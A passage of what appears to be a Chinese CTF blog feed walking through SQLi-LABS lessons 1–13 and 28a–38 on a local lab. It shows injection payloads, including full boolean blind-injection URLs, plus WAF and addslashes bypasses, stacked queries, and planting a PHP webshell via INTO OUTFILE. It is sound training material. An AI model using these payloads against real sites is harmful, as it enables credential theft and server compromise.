&apos;,union1,UnIon1,select1,SeLect1,</span><br></pre></td></tr></table></figure><p>判断出过滤了注释、select、union和空格，没有过滤and和or，以及可以用大小写绕过。<br>基本可以确定是(‘变量’)闭合</p><p><img src="20190327051144949.png" alt></p><p><img src="20190327051155272.png" alt></p><h2 id="less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入"></a>less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=and1,or1,--1,1&apos; &apos; &apos;,union1,UnIon1,select1,SeLect1,</span><br></pre></td></tr></table></figure><p>判断出都没有被过滤。然后就是判断闭合方式。<br>不是单引号闭合</p><p><img src="20190327051315303.png" alt></p><p>也不是双引号闭合</p><p><img src="20190327051322449.png" alt></p><p>是(‘闭合’)</p><p><img src="20190327051334731.png" alt></p><p>语句发现报错</p><p><img src="20190327051342389.png" alt></p><p>发现union select中间有空格会被过滤掉，其他语句没问题</p><p><img src="20190327051352758.png" alt></p><p>在union和select中间加上%a0</p><p><img src="20190327051400636.png" alt></p><p>源码中过滤都被注释了，我们把注释除去。</p><p><img src="20190327051408056.png" alt></p><p>然后还是老方法，发现过滤了select，并且大小写也绕不过去了，没有过滤union，过滤了注释，没有过滤单引号。过滤了空格，并且初步判断为单引号闭合。</p><p><img src="20190327051424895.png" alt></p><p>select无法绕过，union也起不了作用，又不会显示报错信息，那么只能用盲注。</p><p><img src="20190327051433593.png" alt></p><h2 id="Less-29-GET-Error-based-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application基于WAF的一个错误"><a href="#Less-29-GET-Error-based-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application基于WAF的一个错误" class="headerlink" title="Less-29 GET-Error based- IMPIDENCE MISMATCH-Having a WAF in front of web application基于WAF的一个错误"></a>Less-29 GET-Error based- IMPIDENCE MISMATCH-Having a WAF in front of web application基于WAF的一个错误</h2><p>单引号报错发现是单引号闭合,没有过滤注释，空格，引号，unsion，select，and，or</p><p><img src="20190327051505107.png" alt></p><p>在源文件夹中发现了login.php，发现什么闭合方式都不行，可是源代码中是单引号闭合</p><p><img src="20190327051514842.png" alt></p><p><a href="http://secsky.sinaapp.com/216.html" target="_blank" rel="noopener">WAF</a><br><a href="https://blog.csdn.net/nzjdsds/article/details/77758824" target="_blank" rel="noopener">MYSQL注入天书之服务器（两层）架构</a></p><p>在SQL注入过程中主流的WAF绕过技术：</p><p>1.转换特征字符大小写<br>2.利用注释绕过<br>3.编码特征字符绕过<br>4.分隔重写特征字符绕过<br>5.利用截断字符绕过<br>6.变换变量位置绕过<br>7.针对域名保护的绕近<br>8.超大数据包绕过<br>9.转换数据提交方式绕过<br>10.HPP（HTTP参数污染）绕过</p><p><img src="20190327051701789.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=1&amp;id=2</span><br></pre></td></tr></table></figure></p><p>Explain：apache（php）解析最后一个参数，即显示id=2的内容。Tomcat（jsp）解析第一个参数，即显示id=1的内容。</p><p>Tomcat功能类似一个WAF<br>所以我们要传入两个id，第一个用来欺骗waf，第二个用来传送给apache。waf是只允许输入数字的，我们在输入数字的时候先给waf看然后检测正常后才转发给我们需要访问的页面。</p><p>发现是单引号闭合</p><p><img src="20190327051822896.png" alt></p><p>绕过WAF注入什么的就比较简单了</p><p><img src="20190327051830649.png" alt></p><h2 id="Less-30-基于错误的GET型双引号字符型注入"><a href="#Less-30-基于错误的GET型双引号字符型注入" class="headerlink" title="Less-30 基于错误的GET型双引号字符型注入"></a>Less-30 基于错误的GET型双引号字符型注入</h2><p>跟less 29一样，单引号变成双引号</p><p><img src="20190327051845531.png" alt></p><h2 id="Less-31-Protection-with-WAF用WAF防护"><a href="#Less-31-Protection-with-WAF用WAF防护" class="headerlink" title="Less - 31 Protection with WAF用WAF防护"></a>Less - 31 Protection with WAF用WAF防护</h2><p>根据报错知道是(“变量”)闭合</p><p><img src="20190327051900005.png" alt></p><p><img src="20190327051919882.png" alt></p><h2 id="Less-32-Bypass-addslashes-绕过addslashes"><a href="#Less-32-Bypass-addslashes-绕过addslashes" class="headerlink" title="Less - 32 Bypass addslashes()绕过addslashes"></a>Less - 32 Bypass addslashes()绕过addslashes</h2><p>单引号双引号都不会报错 应该是被转义了，用宽字节注入%df’报错</p><p><img src="20190327051919882.png" alt></p><p>发现是单引号闭合。联合查询</p><p><img src="20190327052029383.png" alt></p><p>addslashes函数单引号，双引号，反斜杠 均被添加斜线<br>注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</p><p>原理：mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。我们在过滤 ‘ 的时候，往往利用的思路是将 ‘ 转换为\’ 。</p><p>因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：1. %df吃掉 \ 具体的原因是urlencode(‘) = %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。2. 将 ‘ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是bypass的一种方法。</p><h2 id="Less-33-Bypass-addslashes-绕过-addslashes"><a href="#Less-33-Bypass-addslashes-绕过-addslashes" class="headerlink" title="Less - 33 Bypass addslashes()绕过 addslashes()"></a>Less - 33 Bypass addslashes()绕过 addslashes()</h2><p>跟less-32没什么区别</p><p><img src="20190327052114500.png" alt></p><p>less-32的函数</p><p><img src="20190327052136120.png" alt></p><p>less-33的函数</p><p><img src="20190327052203596.png" alt></p><h2 id="Less-34-Bypass-Add-SLASHES（第34节：绕过添加斜杠）"><a href="#Less-34-Bypass-Add-SLASHES（第34节：绕过添加斜杠）" class="headerlink" title="Less - 34 Bypass Add SLASHES（第34节：绕过添加斜杠）"></a>Less - 34 Bypass Add SLASHES（第34节：绕过添加斜杠）</h2><p>各种姿势都绕不过去</p><p><img src="20190327052215814.png" alt></p><p>应该还是单引号双引号反斜杠被转义了。<br>这里是post型的注入漏洞，同样的也是将post过来的内容进行了’的处理。同样要把\给吃掉。而get型的方式我们是以url形式提交的，因此数据会通过URLencode，如何将方法用在post型的注入当中。将utf-8转换为utf-16或utf-32，例如将 ‘ 转为utf-16为’ 。其实就是把在get提交的%df’经过URLencode后变成’直接复制到post中使用。</p><p><a href="http://www.cnblogs.com/chevin/p/8421349.html" target="_blank" rel="noopener">关于编码：Unicode/UTF-8/UTF-16/UTF-32</a></p><p><img src="20190327053148975.png" alt></p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>根据报错发现单引号被转义了,还是个数字型注入,根本不需要闭合</p><p><img src="20190327053202816.png" alt></p><p>那就比较好办了</p><p><img src="20190327053212971.png" alt></p><p><img src="20190327053227221.png" alt></p><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>id=1’,1”,单引号双引号同样被转义了。同样用宽字节注入</p><p><img src="20190327053242028.png" alt></p><p>根据报错发现是单引号闭合，跟前面的没什么区别</p><p><img src="20190327053253350.png" alt></p><p>看源代码用了一个函数<code>mysql_real_escape_string()</code></p><p><img src="20190327053302602.png" alt></p><p><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">mysql_real_escape_string</a>会转义如下字符</p><p><img src="20190327053414638.png" alt></p><p>转义成功返回这些字符串，失败返回false。</p><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less -37"></a>Less -37</h2><p>跟less 34一样，只是过滤函数不同<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = mysql_real_escape_string($uname1);</span><br><span class="line">$passwd= mysql_real_escape_string($passwd1);</span><br></pre></td></tr></table></figure></p><p><img src="20190327053448874.png" alt></p><h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p>单引号报错，发现是单引号闭合，而且不会转义单引号</p><p><img src="20190327053502763.png" alt></p><p><img src="20190327053509028.png" alt></p><p>发现有点简单就看一下源代码，发现</p><p><img src="20190327053516394.png" alt></p><p><a href="http://www.runoob.com/php/func-mysqli-more-results.html" target="_blank" rel="noopener">PHP mysqli_more_results() 函数</a><br><a href="http://www.runoob.com/php/func-mysqli-multi-query.html" target="_blank" rel="noopener">PHP mysqli_multi_query() 函数</a><br><a href="http://php.net/manual/zh/mysqli.store-result.php" target="_blank" rel="noopener">mysqli_store_result</a><br><a href="http://www.cnblogs.com/lcamry/p/5762905.html" target="_blank" rel="noopener">堆叠注入（Stacked injections）</a></p><p>Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。</p><p>总的来说就是mysqli_mylti_query()这个函数可以执行用；分隔的多条语句。</p><p><img src="20190327053801277.png" alt></p><p><img src="20190327053811553.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;SQLi-LABS 学习SQL注入(less 23-less38 )&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="Web" scheme="http://archimesan.me/categories/CTF/Web/"/>
    
    
      <category term="sql注入" scheme="http://archimesan.me/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQLi-LABS 学习SQL注入1</title>
    <link href="http://archimesan.me/2018/06/01/SQLi-LABS-%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A51/"/>
    <id>http://archimesan.me/2018/06/01/SQLi-LABS-学习SQL注入1/</id>
    <published>2018-06-01T04:01:34.000Z</published>
    <updated>2019-03-27T12:25:17.801Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>SQLi-LABS 学习SQL注入(less 1-less 22)<br><a id="more"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET和POST的区别及get和post关于请求的编解码的问题</span><br><span class="line">GET请求中对MySQL的注释：-- ，--+</span><br><span class="line">POST请求对MySQL的注释：-- ，#</span><br><span class="line">注意:--后面必须跟空格，一般可以写--空格+字母 如：-- k来进行注释</span><br></pre></td></tr></table></figure><p><img src="20190327120806503.png" alt></p><h2 id="less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="less 1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a>less 1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</h2><p>先id=1’，发现报错</p><p><img src="20190327125014669.png" alt></p><p>分析’’1’’ LIMIT 0,1’，除去首尾两个自动加上的单引号可以猜测出来是单引号闭合。</p><p>接下来是猜字段：</p><p><img src="20190327125034524.png" alt></p><p>到order by 4之后报错说明select 语句只有3个查询字段</p><p>也可以用union来判断select语句有几个查询字段</p><p><img src="20190327125047261.png" alt></p><p><img src="20190327125057959.png" alt></p><p>可为什么union 后面的select 1,2,3没有出现其中的两个数据</p><p><img src="图片.png.png" alt="图片.png"></p><p>并且在命令行中是可以查询到两行的</p><p>看一下源码，可以看到函数<code>mysql_fetch_array</code>只被调用了一次，而<code>mysql_fetch_array()</code> 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有，具体看你第二个参数是什么，所以这里无论怎么折腾最后只会出来第一行的查询结果。</p><p><img src="20190327125130035.png" alt></p><p>如果要把结果集的所有行都取出来，需要用到while循环，看下面的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">while ($row = mysql_fetch_array($result)) &#123;  </span><br><span class="line">    echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;  </span><br><span class="line">    echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];  </span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;  </span><br><span class="line">    echo &apos;Your Password:&apos; .$row[&apos;password&apos;];  </span><br><span class="line">    echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以只要让union前面的语句查询结果为空，那么后面的select语句查询的结果就会显示出来。这个id他一般传的是数字，而且一般都是从1开始自增的，我们可以把id值设为非正数（负数或0），浮点数，字符型或字符串都行</p><p><img src="20190327125152211.png" alt></p><p>下面就要开始真正查询数据库的信息了，可以看到只有第二列和第三列显示在网页上，所以我们只能用这两个位置，但是两个位置是不够的。这时候需要用到数据库的连接函数concat或者concat_ws其中concat_ws的第一个参数是连接字符串的分隔符，还会用到group__concat(可以把查询出来的多行连接起来)</p><p><a href="https://www.2cto.com/database/201202/120705.html" target="_blank" rel="noopener">concat和concat_ws()区别及MySQL的几个实用字符串函数</a></p><p>user():返回当前数据库连接使用的用户<br>database():返回当前数据库连接使用的数据库<br>version():返回当前数据库的版本</p><p><img src="20190327125202531.png" alt></p><p>(32是空格的十进制ASCII，58是：的十进制ASCII。)<br>爆出了数据库版本，数据库名字和数据库连接使用的用户名。</p><p>接下来爆数据表的名字</p><p><img src="20190327125216556.png" alt></p><p>这里的<code>0x7365637572697479=security</code>的16进制，因为<code>table_schema=&#39;security&#39;</code>需要用单引号，因为大部分Web应用程序防火墙都过滤了单引号，而转化为16进制之后就可以突破很多防火墙及防注入程序。</p><p>mysql的数据库<code>information_schema</code>，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，用户权限等信息，下面说一下常用的几个表<br>SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</p><p>TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表</p><p>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是<code>show columns from schemaname.tablename</code>的结果取之此表。</p><p>[]Mysql数据库information_schema系统表说明(<a href="https://wenku.baidu.com/view/6358a5fd89eb172ded63b7a8.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/6358a5fd89eb172ded63b7a8.html</a>)</p><p>有了users表名，接下来就要爆字段名，同理可以通过limit把所有的字段名枚举出来，知道了有<code>id，username，password</code></p><p><img src="20190327125300654.png" alt></p><p>然后就可以直接select加枚举爆出所有的<code>id，username，password</code></p><p><img src="图片.png1.png" alt="图片.png"></p><h2 id="less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="less 2 GET - Error based - Intiger based (基于错误的GET整型注入)"></a>less 2 GET - Error based - Intiger based (基于错误的GET整型注入)</h2><p>id=1’</p><p><img src="20190327125330634.png" alt></p><p>根据报错可以知道这里是整型注入，变量没有被字符包裹。<br>所以这里不需要单引号，可以直接注释后面的语句，剩余操作同lesson1</p><p><img src="20190327125341593.png" alt></p><h2 id="less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="less 3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>less 3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h2><p>id=1’</p><p><img src="20190327125402134.png" alt></p><p>根据报错可以知道这里是(‘变量’)，所以用’)闭合，后面注释，其他同lesson1步骤即可。</p><p><img src="20190327125415438.png" alt></p><p>之后发现id=1”也是不会报错的</p><p><img src="20190327125425481.png" alt></p><p>但是union后面的select语句无效</p><p><img src="20190327125507117.png" alt></p><p>最后发现是由于”没有闭合导致后面的注释不起作用。</p><p><img src="20190327125525125.png" alt></p><p><img src="20190327125507117.png" alt></p><p>可以用and 1=0 和1=1来判断</p><p><img src="20190327125540177.png" alt></p><p><img src="图片.png2.png" alt="图片.png"></p><h2 id="less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="less 4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>less 4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h2><p>直接上单引号，发现没有报错，这是因为php中双引号可以包含单引号,那么就让id=1”</p><p><img src="20190327125612908.png" alt></p><p>根据报错可以知道这里是(“变量”)，所以”)闭合，其他同lesson1步骤</p><p><img src="20190327125623279.png" alt></p><h2 id="less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="less 5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>less 5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h2><p>id=1’</p><p><img src="20190327125634649.png" alt></p><p>根据报错可以知道这里是单引号闭合，可是即使正常闭合也不会显示数据</p><p><img src="20190327125643463.png" alt></p><p>因为源码中根本就没有输出$row</p><p><img src="20190327125649568.png" alt></p><p>很明显正常是不能够爆出来数据库的内容，所以就要通过报错来显示数据库中的内容。</p><p><img src="20190327125657325.png" alt></p><p><img src="20190327125705465.png" alt></p><p>有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。（我发现如果没有floor和rand函数也是不会报错的）</p><p><a href="http://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">双查询注入</a></p><p><img src="20190327010120645.png" alt></p><p>由于这里的报错具有随机性，所以如果没有报错需要多提交几次</p><h2 id="less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入"><a href="#less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入" class="headerlink" title="less 6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)"></a>less 6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</h2><p>和less5一样，只不过变成了双引号闭合</p><p><img src="20190327010137371.png" alt></p><p>查表</p><p><img src="20190327010144547.png" alt></p><p>查列</p><p><img src="20190327010214934.png" alt></p><p>查数据</p><p><img src="20190327010232536.png" alt></p><h2 id="less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）"><a href="#less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）" class="headerlink" title="less 7 GET - Dump into outfile - String （导出文件GET字符型注入）"></a>less 7 GET - Dump into outfile - String （导出文件GET字符型注入）</h2><p>导出到文件就是可以将查询结果导出到一个文件中，如常见的将一句话木马导出到一个php文件中<br>使用此漏洞需要知道WEB程序的根路径并且MYSQL的<code>secure-file-priv</code>配置应为可写入该路径</p><p>id=1</p><p><img src="20190327010312438.png" alt></p><p>id=1’发现错误被屏蔽了</p><p><img src="20190327010322431.png" alt></p><p>而且id=1”或者id=1”)都显示正确，所以这里也涉及到了未闭合导致注释失效的问题。<br>但是只有id=1’)) and 1=0报错，所以可以判断出来是单引号加两个括号闭合</p><p><img src="20190327010332050.png" alt></p><p>为什么最后的结果在数据库中不为空，是因为<a href="http://www.jb51.net/article/101531.htm" target="_blank" rel="noopener">MySQL的隐式转换</a></p><p><img src="20190327010437721.png" alt></p><p><a href="http://www.jb51.net/article/101531.htm" target="_blank" rel="noopener">MySQL的隐式类型转换整理总结</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@@datadir 读取数据库路径</span><br><span class="line">@@basedir MYSQL 获取安装路径</span><br><span class="line">这里可以通过在less1中获取网站的路径</span><br></pre></td></tr></table></figure></p><p><img src="20190327010725295.png" alt></p><p>可以猜到网站路径<code>E:\tool\PHPstudy\PHPTutorial\WWW</code><br>然后就可以通过使用<code>SELECT...INTO OUTFILE</code>语句导出数据到文本文件上上传一句话木马</p><p><img src="20190327010739592.png" alt></p><p>然后上菜刀</p><p><img src="20190327010749207.png" alt></p><h2 id="less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注"><a href="#less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注" class="headerlink" title="less 8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)"></a>less 8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</h2><p>id=1</p><p><img src="20190327010834731.png" alt></p><p>id=1’</p><p><img src="20190327010852000.png" alt></p><p>没有任何提示，因为它把错误信息隐藏了，所以并不能用显错式注入，只能用盲注。</p><p>详解SQL盲注测试高级技巧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MySQL盲注的相关函数：</span><br><span class="line">length(str)：返回str字符串的长度。</span><br><span class="line">substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</span><br><span class="line">mid(str,pos,len):跟上面的一样，截取字符串</span><br><span class="line">ascii(str)：返回字符串str的最左面字符的ASCII代码值。</span><br><span class="line">ord(str):同上，返回ascii码</span><br><span class="line">if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select database()),1,1))：返回数据库名称的第一个字母,转化为ascii码</span><br><span class="line">if(ascii(substr((select database()),1,1))&gt;64, 1, 0)：ascii大于64就返回true，if就返回1，否则返回0</span><br></pre></td></tr></table></figure><p>二分法猜数据库名字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1)&gt;64 %23   返回正确，大于64  </span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;96 %23  返回正确，大于96  </span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&lt;123 %23 返回正确，小于123 ，区间在97-122  </span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;109 %23 返回正确，大于109，区间在110-122  </span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;116 %23 返回错误，所以在110-116之间  </span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;112 %23 返回正确，大于112，区间在113-116之间  </span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;114 %23 返回正确，大于114，间在115-116之间  </span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;115 %23 返回错误，不大于115，即第一个字母的ascii为115，即字母s</span><br></pre></td></tr></table></figure></p><p>盲注一般是写脚本或者使用工具辅助，否则手动盲注需要大量时间</p><h2 id="less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注"><a href="#less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注" class="headerlink" title="less 9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)"></a>less 9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)</h2><p>无论正确还是错误他都只会显示<code>you are in......</code>所以只能用基于时间的盲注</p><p>只有单引号闭合的时候，他才会延迟5秒。所以可以判断出来这里是单引号闭合。</p><p><img src="20190327011135003.png" alt></p><p>然后同less 8的盲注，</p><p><img src="20190327011147798.png" alt></p><p>当database()第一个字母的ascii大于115的时候会延迟5秒，当大于114的时候没有延迟，所以可以判断第一个字母的ascii直是115。其他数据查询方式同理</p><h2 id="less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注"><a href="#less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注" class="headerlink" title="less 10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)"></a>less 10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)</h2><p>这道题跟less 9一摸一样，只不过是单引号闭合变为双引号闭合</p><p><img src="20190327011209337.png" alt></p><p>因为双引号闭合的时候，延迟了5秒。</p><h2 id="less11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入"><a href="#less11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入" class="headerlink" title="less11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)"></a>less11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</h2><p>查看元素可以知道两个POST分别是uname和passwd。</p><p><img src="20190327011238124.png" alt></p><p>首先uname=1’&amp;passwd=2,报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;2&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure></p><p>发现1没有报错，2为什么两边只有一个单引号，看源码</p><p><img src="20190327011406347.png" alt></p><p>应该是加进去的单引号跟前面的单引号闭合，剩余的单引号与password前面的单引号闭合，最后剩余了password后面的单引号。</p><p>加个or 1=1 – k发现登陆成功</p><p><img src="20190327011417120.png" alt></p><p>或者在passwd后面加单引号报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;2&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure></p><p>可以发现是单引号闭合，然后直接or 1=1 – k发现登陆成功</p><p><img src="20190327011446658.png" alt></p><p>如果是<code>uname=1&#39; or &#39;1&#39;=&#39;1&amp;passwd=2</code>，在源代码中显示正常</p><p><img src="20190327011501411.png" alt></p><p>可是却登陆失败。</p><p>因为and的优先级高于or 【就是and先运算】， <code>&#39;1&#39;=&#39;1&#39; and password=&#39;2&#39;</code>先运算右边的<code>password=&#39;2&#39;</code>在数据表中不存在，所以右边是false，那么整个and就是false。然后计算<code>uname=&#39;1&#39; or false</code> ，而两边都是false所以最后的结果就是false。</p><p>那么就<code>uname=1&amp;passwd=2&#39; or &#39;1&#39;=&#39;1</code>在源码中</p><p><img src="20190327011536263.png" alt></p><p>先计算<code>uname=&#39;1&#39; and password=&#39;2&#39;</code>结果是false，然后计算<code>false or 1=1</code>，右边是true，那么整个or就是true。</p><p>这里也可以通过盲注获取信息</p><p><img src="20190327011557607.png" alt></p><h2 id="less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入"><a href="#less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入" class="headerlink" title="less 12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)"></a>less 12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</h2><p>双引号报错</p><p><img src="20190327011612178.png" alt></p><p>可以知道是(“变量”)闭合，直接绕过</p><p><img src="20190327011623357.png" alt></p><h2 id="less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="less 13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>less 